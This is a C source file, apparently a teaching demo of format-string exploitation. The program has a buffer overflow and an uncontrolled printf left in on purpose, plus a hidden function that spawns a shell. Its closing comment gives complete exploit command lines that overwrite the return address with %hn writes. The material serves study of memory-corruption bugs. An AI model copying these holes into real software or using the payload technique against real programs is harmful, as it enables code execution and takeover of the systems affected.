#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo(char *prn)
{
  char text[1024];
  strcpy(text, prn);
  //strncpy(text, prn, 1023);
  //text[1023]=0x0;
  printf(text);
}

void not_called()
{
  printf("\nwe come in peace\n");
  system("/bin/sh");
  exit(1);
}

int main(int argc, char *argv[])
{
  if (argc < 2) {
    printf("Not enough arguments\n");
    exit(1);
  }

  printf("main: %p foo: %p, argv[1]: %p not_called: %p rip: %p\n", &main, &foo,
         argv[1], &not_called, ((unsigned long*)__builtin_frame_address(0)+1) );
  //printf("string: '%s'\n", argv[1]);
  foo(argv[1]);
  printf("\nReturned safely\n");
  return 0;
}

/*
  gcc -m32 -O0 format_string.c
  nm a.out | grep DTOR to find out dtor: 08049f18 (+4)


  address of not_called: 0x0804856a
   break up into 2 half words:
   0x0804 =  2052
   0x856a = 34154
     
   2052+65536 = 0x12052
   0x12052(total) - 0x844f = 0x9c03 = 39939

  RIP in foo: 0xffffd37c
  
  2052  - 9 (string length before) = 2043
  34154 - 2052 = 32102

  write 2 half words at the following locations. read locations from text using
  argument passing, arg 11 is low part of address and arg 12 is high part of
  address. both parts are written and RIP is overwritten.
  gdb --args ./a.out `perl -e 'print
  "\x7c\xd3\xff\xff\x7e\xd3\xff\xff"'`%12\$2043x.%12\$hn%11\$32102x%11\$hn

  --------
  
 with -fno-stack-protector
 address of not_called: 0x080484e2
   
   break up into 2 half words:
   0x0804 =  2052
   0x84e2 = 34018
     
  RIP in foo: 0xffffd38c
  
  2052  - 9 (string length before) = 2043
  34018 - 2052 = 31966

  write 2 half words at the following locations. read locations from text using
  argument passing, arg 11 is low part of address and arg 12 is high part of
  address. both parts are written and RIP is overwritten.
  PS1='\$ ' ./format_string `perl -e 'print
  "\x0c\xd4\xff\xff\x0e\xd4\xff\xff"'`%05\$2043x.%05\$hn%04\$31966x%04\$hn
  
  LD_PRELOAD=../../../../projects/trustBtOX/lib/libfastbt.so.0.3.0 PS1='\$ '
  ./format_string `perl -e 'print
  "\xbc\xd3\xff\xff\xbe\xd3\xff\xff"'`%05\$2043x.%05\$hn%04\$31966x%04\$hn

  Interesting articles:
  http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.7+Format+String+Bugs/
  http://www.acm.uiuc.edu/sigmil/talks/general_exploitation/format_strings/
  http://www.autonomy.net.au/display/insecurity/Format-String+Exploits
  http://julianor.tripod.com/bc/NN-formats.txt
*/
